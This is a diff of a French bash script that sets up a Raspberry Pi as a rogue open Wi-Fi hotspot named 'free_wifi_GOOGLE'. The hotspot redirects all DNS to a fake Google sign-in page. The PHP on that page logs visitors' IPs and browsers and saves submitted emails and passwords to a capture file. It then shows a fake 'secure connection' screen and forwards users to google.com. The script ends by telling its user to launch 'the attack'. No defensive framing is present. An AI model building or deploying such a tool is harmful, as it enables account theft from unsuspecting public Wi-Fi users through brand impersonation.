@@ -1,38 +1,46 @@
 #!/bin/bash
 
-# Répertoires
+# === CONFIGURATION ===
+INTERFACE_AP="wlan1"
+SSID_NAME="free_wifi_GOOGLE"
 DIR="/home/pi/pineapple"
 WWW="$DIR/www"
-CAPTURE="$DIR/captures"
-INTERFACE_AP="wlan1"
-GATEWAY="10.0.0.1"
+CAPTURES="$DIR/captures"
 
-echo "[*] Mise à jour et installation des paquets..."
-sudo apt update
-sudo apt install -y hostapd dnsmasq lighttpd php
+echo "[*] Installation des paquets nécessaires..."
+sudo apt-get update
+sudo apt-get install -y hostapd dnsmasq lighttpd php php-cgi php-cli
 
-echo "[*] Création de l’arborescence..."
-mkdir -p "$WWW" "$CAPTURE"
+echo "[*] Création des répertoires..."
+mkdir -p "$WWW"
+mkdir -p "$CAPTURES"
 
-echo "[*] Configuration de dhcpcd..."
-if ! grep -q "denyinterfaces $INTERFACE_AP" /etc/dhcpcd.conf; then
-    echo "denyinterfaces $INTERFACE_AP" | sudo tee -a /etc/dhcpcd.conf
-    sudo systemctl restart dhcpcd
-fi
+# === LOGO GOOGLE ===
+cat > "$WWW/logo.svg" << 'EOF'
+<svg width="74" height="24" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+<path fill="#4285F4" d="M9.5 10.5v3.4h5.5c-.2 1.2-.8 2.2-1.8 2.9l2.9 2.3c1.7-1.6 2.7-3.9 2.7-6.6 0-.5 0-.9-.1-1.3H9.5z"/>
+<path fill="#34A853" d="M9.5 17.5c1.6 0 2.9-.5 3.9-1.4l-2.9-2.3c-.6.4-1.4.7-2.3.7-1.8 0-3.4-1.2-3.9-2.9l-3 2.3c1 3 3.9 5.2 7.2 5.2z"/>
+<path fill="#FBBC05" d="M5.6 11.6c-.1-.4-.1-.8-.1-1.2s0-.8.1-1.2L2.6 6.9C1.9 8.3 1.5 9.9 1.5 11.6s.4 3.3 1.1 4.7l3-2.3z"/>
+<path fill="#EA4335" d="M9.5 5.2c1 0 1.9.3 2.6.9l2.4-2.4C13.1 2.3 11.4 1.5 9.5 1.5 6.2 1.5 3.3 3.7 2.6 6.9l3 2.3c.5-1.7 2.1-3 3.9-3z"/>
+</svg>
+EOF
 
-echo "[*] Désactivation de dnsmasq par défaut..."
-sudo systemctl stop dnsmasq 2>/dev/null
-sudo systemctl disable dnsmasq 2>/dev/null
-
-echo "[*] Création de la fausse page Google..."
+# === PAGE D’ACCUEIL ===
 cat > "$WWW/index.php" << 'EOF'
 <?php
+$logfile = "/home/pi/pineapple/captures/visits.log";
+$ip = $_SERVER['REMOTE_ADDR'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$uri = $_SERVER['REQUEST_URI'];
+$time = date("Y-m-d H:i:s");
+file_put_contents($logfile, "$time - $ip - $uri - $agent\n", FILE_APPEND);
+
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $login = $_POST["login"];
     $password = $_POST["password"];
     $creds = date("Y-m-d H:i:s") . " - $login : $password\n";
     file_put_contents("/home/pi/pineapple/captures/creds.txt", $creds, FILE_APPEND);
-    header("Location: https://www.google.com");
+    header("Location: loading.php");
     exit;
 }
 ?>
@@ -40,195 +48,92 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
+  <title>Connexion à free_wifi_GOOGLE</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Connexion Internet</title>
   <style>
-    body {
-      background-color: #f2f2f2;
-      font-family: 'Roboto', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 0;
-    }
-    .container {
-      margin-top: 100px;
-      background-color: white;
-      display: inline-block;
-      padding: 40px;
-      border-radius: 8px;
-      box-shadow: 0px 0px 15px rgba(0,0,0,0.2);
-    }
-    h1 {
-      color: #4285F4;
-      margin-bottom: 20px;
-    }
-    input[type="text"], input[type="password"] {
-      padding: 10px;
-      margin: 10px 0;
-      width: 250px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      font-size: 14px;
-    }
-    input[type="submit"] {
-      background-color: #4285F4;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      margin-top: 20px;
-      border-radius: 4px;
-      cursor: pointer;
-      font-size: 14px;
-    }
-    input[type="submit"]:hover {
-      background-color: #3367D6;
-    }
-    .footer {
-      margin-top: 50px;
-      font-size: 12px;
-      color: #aaa;
-    }
+    body {background-color: #f2f2f2;font-family: 'Roboto', sans-serif;text-align: center;}
+    .container {margin-top: 100px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.2);}
+    img {height: 30px; margin-bottom: 20px;}
+    input {padding: 10px; margin: 10px 0; width: 250px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;}
+    input[type="submit"] {background-color: #4285F4; color: white; border: none; cursor: pointer;}
+    .footer {margin-top: 40px; font-size: 12px; color: #aaa;}
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Connexion au réseau</h1>
-    <p>Pour accéder à Internet, connectez-vous avec vos identifiants Google.</p>
+    <img src="logo.svg" alt="Google">
+    <h1>Connexion au réseau Wi-Fi</h1>
+    <p class="network-name">free_wifi_GOOGLE</p>
+    <p>Veuillez vous connecter avec votre compte Google pour accéder à Internet.</p>
     <form method="POST">
       <input type="text" name="login" placeholder="Adresse e-mail"><br>
       <input type="password" name="password" placeholder="Mot de passe"><br>
       <input type="submit" value="Se connecter">
     </form>
   </div>
-  <div class="footer">
-    © Google Inc.
-  </div>
+  <div class="footer">© Google Inc.</div>
 </body>
 </html>
 EOF
 
-echo "[*] Ajout des fichiers de détection captive portal..."
-echo "<html><meta http-equiv='refresh' content='0; url=/index.php'></html>" > "$WWW/generate_204"
-cp "$WWW/generate_204" "$WWW/hotspot-detect.html"
-cp "$WWW/generate_204" "$WWW/ncsi.txt"
+# === PAGE DE REDIRECTION ===
+cat > "$WWW/loading.php" << 'EOF'
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion sécurisée...</title>
+  <meta http-equiv="refresh" content="3;url=https://www.google.com">
+  <style>
+    body {background-color: #fff; font-family: 'Roboto', sans-serif; text-align: center; margin-top: 120px; color: #555;}
+    .loader {border: 6px solid #f3f3f3; border-top: 6px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; margin: 20px auto; animation: spin 1s linear infinite;}
+    @keyframes spin {0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); }}
+    p {font-size: 16px;}
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <p>Connexion sécurisée en cours...<br>Veuillez patienter.</p>
+</body>
+</html>
+EOF
 
-echo "[*] Génération des configurations hostapd et dnsmasq..."
+# === HOSTAPD ===
 cat > "$DIR/hostapd.conf" <<EOF
 interface=$INTERFACE_AP
 driver=nl80211
-ssid=Free_wifi
+ssid=$SSID_NAME
 hw_mode=g
 channel=6
 auth_algs=1
 ignore_broadcast_ssid=0
 EOF
 
+# === DNSMASQ ===
 cat > "$DIR/dnsmasq.conf" <<EOF
 interface=$INTERFACE_AP
-bind-interfaces
 dhcp-range=10.0.0.10,10.0.0.50,12h
+dhcp-option=3,10.0.0.1
+dhcp-option=6,10.0.0.1
 address=/#/10.0.0.1
+log-queries
+log-dhcp
 EOF
 
-echo "[*] Création du menu interactif pineapple_menu.sh..."
-cat > "$DIR/pineapple_menu.sh" << 'EOF'
-#!/bin/bash
+# === CONFIGURATION RÉSEAU ===
+sudo ip link set $INTERFACE_AP down
+sudo ip addr flush dev $INTERFACE_AP
+sudo ip addr add 10.0.0.1/24 dev $INTERFACE_AP
+sudo ip link set $INTERFACE_AP up
 
-WLAN_FAKEAP="wlan1"
-GATEWAY="10.0.0.1"
-DIR="/home/pi/pineapple"
-CAPTURE_FILE="$DIR/captures/creds.txt"
+# === CONFIGURATION LIGHTTPD + PHP ===
+sudo lighttpd-enable-mod fastcgi-php
+sudo systemctl restart lighttpd
 
-start_pineapple() {
-    echo "[*] Démarrage du fake AP..."
-    sudo ip link set "$WLAN_FAKEAP" down
-    sudo iw dev "$WLAN_FAKEAP" set type __ap
-    sudo ip addr flush dev "$WLAN_FAKEAP"
-    sudo ip addr add "$GATEWAY/24" dev "$WLAN_FAKEAP"
-    sudo ip link set "$WLAN_FAKEAP" up
+# === DÉPLOIEMENT DES FICHIERS WEB ===
+sudo rm -rf /var/www/html/*
+sudo cp -r "$WWW"/* /var/www/html/
+sudo chmod -R 755 "$DIR" /var/www/html
+sudo chown -R www-data:www-data /var/www/html
 
-    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
-    sudo iptables -F
-    sudo iptables -t nat -F
-    sudo iptables -t nat -A PREROUTING -i "$WLAN_FAKEAP" -p tcp --dport 80 -j DNAT --to "$GATEWAY":80
-    sudo iptables -t nat -A POSTROUTING -j MASQUERADE
-
-    echo "[*] Déploiement des fichiers web..."
-    sudo rm -rf /var/www/html/*
-    sudo cp -r "$DIR/www/"* /var/www/html/
-    sudo systemctl restart lighttpd
-
-    sudo dnsmasq -C "$DIR/dnsmasq.conf"
-    sudo hostapd "$DIR/hostapd.conf" &
-
-    echo "[✔] Pineapple actif. SSID : Free_wifi"
-    read -p "Appuie sur Entrée pour revenir au menu..."
-}
-
-stop_pineapple() {
-    echo "[*] Arrêt du Pineapple..."
-    sudo killall hostapd dnsmasq 2>/dev/null
-    sudo iptables -F
-    sudo iptables -t nat -F
-    sudo ip addr flush dev "$WLAN_FAKEAP"
-    sudo ip link set "$WLAN_FAKEAP" down
-    sudo iw dev "$WLAN_FAKEAP" set type managed
-    sudo ip link set "$WLAN_FAKEAP" up
-    echo "[✔] Pineapple arrêté."
-    read -p "Appuie sur Entrée pour revenir au menu..."
-}
-
-show_creds() {
-    echo -e "\n[📄] Identifiants capturés :"
-    if [[ -f "$CAPTURE_FILE" ]]; then
-        cat "$CAPTURE_FILE"
-    else
-        echo "Aucun identifiant trouvé."
-    fi
-    echo
-    read -p "Appuie sur Entrée pour revenir au menu..."
-}
-
-clear_creds() {
-    if [[ -f "$CAPTURE_FILE" ]]; then
-        > "$CAPTURE_FILE"
-        echo "[✔] Identifiants effacés."
-    else
-        echo "Aucun fichier à vider."
-    fi
-    read -p "Appuie sur Entrée pour revenir au menu..."
-}
-
-while true; do
-    clear
-    echo "============================="
-    echo "   🍍 MENU PINEAPPLE RPi"
-    echo "============================="
-    echo "1. Démarrer le Pineapple"
-    echo "2. Arrêter le Pineapple"
-    echo "3. Voir les identifiants capturés"
-    echo "4. Vider les identifiants"
-    echo "5. Quitter"
-    echo "-----------------------------"
-    read -p "Choix [1-5] : " choice
-
-    case "$choice" in
-        1) start_pineapple ;;
-        2) stop_pineapple ;;
-        3) show_creds ;;
-        4) clear_creds ;;
-        5) echo "À bientôt !"; exit 0 ;;
-        *) echo "Option invalide."; sleep 1 ;;
-    esac
-done
-EOF
-
-chmod +x "$DIR/pineapple_menu.sh"
-
-echo "[*] Préparation du fichier de capture..."
-touch "$CAPTURE/creds.txt"
-sudo chown -R www-data:www-data "$CAPTURE"
-sudo chmod -R 755 "$CAPTURE"
-
-echo "[✔] Installation terminée."
-echo "➡️  Lance le menu avec : bash $DIR/pineapple_menu.sh"
+echo "[✔] Installation terminée. Utilise le menu pour démarrer l’attaque."
